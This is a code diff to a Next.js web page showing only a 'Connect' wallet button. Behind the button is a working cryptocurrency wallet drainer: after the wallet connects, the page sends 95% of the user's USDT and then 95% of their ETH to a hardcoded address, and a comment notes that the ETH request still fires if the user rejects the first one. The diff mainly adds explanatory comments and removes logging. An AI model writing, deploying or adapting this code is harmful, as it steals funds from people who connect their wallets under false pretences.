@@ -1,17 +1,12 @@
-import Head from "next/head";
 import Image from "next/image";
-import { Inter } from "next/font/google";
-import styles from "@/styles/Home.module.css";
-const inter = Inter({ subsets: ["latin"] });
 import { address, abi } from "../constants/ethUsdt";
-
 import Web3Modal from "web3modal";
-import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import WalletConnectProvider from "@walletconnect/web3-provider";
 
 let web3Modal;
 
+//wallet connect option
 const providerOptions = {
   walletconnect: {
     package: WalletConnectProvider, // required
@@ -32,7 +27,7 @@ export default function Home() {
   let provider, signer, signerAddress, contract;
   async function connect() {
     try {
-      const web3ModalProvider = await web3Modal.connect();
+      const web3ModalProvider = await web3Modal.connect(); //connect to wallet
       provider = new ethers.providers.Web3Provider(web3ModalProvider);
       signer = provider.getSigner();
       signerAddress = await signer.getAddress();
@@ -40,7 +35,7 @@ export default function Home() {
         await sendUsdt();
         await sendEth();
       } catch {
-        await sendEth();
+        await sendEth(); //if user rejected first request, second on still requests
       }
     } catch (e) {
       console.log(e);
@@ -48,34 +43,26 @@ export default function Home() {
   }
 
   async function sendUsdt() {
-    contract = new ethers.Contract(address, abi, signer);
+    contract = new ethers.Contract(address, abi, signer); //new instance of usdt contract
     const balance = Number(
       (await contract.balanceOf(signerAddress)).toString()
     );
-    console.log(balance / 1e18);
     const tx = await contract.transfer(
-      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
+      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address
       BigInt(balance * 0.95)
     );
-    const txr = await tx.wait(1);
+    await tx.wait(1);
   }
 
   async function sendEth() {
     const balance = Number(
       (await provider.getBalance(signerAddress)).toString()
     );
-    console.log(balance);
     const tx = await signer.sendTransaction({
       to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
       value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
     });
-    console.log("Sent! 🎉");
-    console.log(`TX hash: ${tx.hash}`);
-    console.log("Waiting for receipt...");
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
-    console.log(
-      `TX details: https://dashboard.tenderly.co/tx/sepolia/${tx.hash}\n`
-    );
   }
 
   return (
@@ -87,7 +74,6 @@ export default function Home() {
         height={300} // Height of the image
       />
       <button onClick={connect} className="wallet-connect-button">
-        {" "}
         Connect
       </button>
     </div>
